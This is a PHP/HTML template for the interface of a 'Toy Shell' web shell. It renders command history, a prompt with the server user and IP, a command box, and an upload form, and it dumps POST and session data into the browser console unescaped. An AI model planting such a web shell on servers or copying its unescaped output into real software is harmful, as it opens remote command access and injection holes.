<?php
if (! isset($Shell)) {
    header("HTTP/1.0 404 Not Found");
    exit();
}
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Toy Shell - PHP</title>
    <!--highlight-->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.2/styles/atom-one-dark-reasonable.min.css">
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.0/highlight.min.js"></script>
    <style>
<?php include 'template/window.css'; ?>
    </style>
    <script>
        // highlight
        document.addEventListener('DOMContentLoaded', (event) => {
            document.querySelectorAll('div.code').forEach((block) => {
                hljs.highlightBlock(block);
            });
        });

        // auto scroll
        var element = document.documentElement;
        var bottom = element.scrollHeight - element.clientHeight;
        window.scroll(0, bottom);

        // debuginfo
        <?php
            ob_start();
            echo '!POST' . PHP_EOL;
            var_dump($_POST);
            echo '!SESSION' . PHP_EOL;
            var_dump($_SESSION);
            $dump = ob_get_contents();
            ob_end_clean();
            $dump = str_replace('\'', '"', $dump);
            $dump = preg_replace("/\r\n|\r|\n/", '\n', $dump)
        ?>
        console.log('[debug]\n<?php echo $dump; ?>');
    </script>
</head>
<body>

<div class="code shell">
    ╔╦╗┌─┐┬ ┬  ╔═╗┬ ┬┌─┐┬  ┬
     ║ │ │└┬┘  ╚═╗├─┤├┤ │  │
     ╩ └─┘ ┴   ╚═╝┴ ┴└─┘┴─┘┴─┘
    *Cannot execute interactive command.
</div>


<?php echo $_SESSION['webshell']['history']; ?>

<form method="POST">
<?php
    printf(
        '[%s@%s %s]' . PHP_EOL,
        $_SESSION['webshell']['sys_user'],
        $_SERVER['SERVER_ADDR'],
        $_SESSION['webshell']['path']
    );
?>
<br>

<table>
    <tr>
        <td class="clr-61aeee">$&nbsp;</td>
        <td style="width: 100%;"><input type="text" id="cmd" name="cmd" autocomplete="on" list="cmd-list" autofocus></td>
    </tr>
</table>

<datalist id="cmd-list">
    <?php
    foreach ($conf['command_list'] as $key => $value) {
        printf('<option value="%s">%s</option>', $value, $key);
    }
    ?>
</datalist>
</form>

<?php include 'template/upload.tpl.php'; ?>

</body>
</html>